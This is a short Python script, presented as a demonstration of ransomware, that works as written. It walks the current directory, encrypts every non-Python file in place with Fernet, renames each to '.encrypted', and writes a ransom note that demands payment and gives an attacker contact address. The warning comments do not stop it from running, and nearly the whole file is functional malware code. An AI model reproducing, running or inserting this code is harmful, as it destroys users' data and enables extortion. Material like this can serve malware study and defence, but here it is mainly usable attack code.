import os
from cryptography.fernet import Fernet

# WARNING: DO NOT RUN THIS CODE - IT WILL ENCRYPT FILES IN THE CURRENT DIRECTORY

def generate_key():
    """Generate a key for encryption/decryption"""
    return Fernet.generate_key()

def encrypt_file(filepath, key):
    """Encrypt a single file"""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        
        with open(filepath, 'wb') as f:
            f.write(encrypted)
            
        # Rename file to show it's encrypted
        os.rename(filepath, filepath + '.encrypted')
        
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")

def encrypt_directory(directory, key):
    """Encrypt all files in a directory"""
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            # Skip already encrypted files and python files
            if not filepath.endswith('.encrypted') and not filepath.endswith('.py'):
                encrypt_file(filepath, key)

def create_ransom_note(directory, key):
    """Create a ransom note with instructions"""
    note = f"""YOUR FILES HAVE BEEN ENCRYPTED!

To decrypt your files, you need to pay a ransom and provide this key:
{key.decode()}

Contact: attacker@example.com
"""
    with open(os.path.join(directory, 'READ_ME_RANSOM.txt'), 'w') as f:
        f.write(note)

# WARNING: ACTUAL RANSOMWARE WOULD TARGET MORE FILES AND DIRECTORIES
if __name__ == "__main__":
    print("WARNING: This is a demonstration of ransomware concepts.")
    print("Do not run this on any system with important files.")
    
    # In real ransomware, this would target user documents, pictures, etc.
    target_dir = os.getcwd()  # Just using current directory for demo
    
    # Generate and print key (in real malware, this would be sent to attacker)
    key = generate_key()
    print(f"Generated key: {key.decode()}")
    
    # Encrypt files
    encrypt_directory(target_dir, key)
    
    # Create ransom note
    create_ransom_note(target_dir, key)
    
    print("Simulation complete. Again, DO NOT USE THIS MALICIOUSLY.")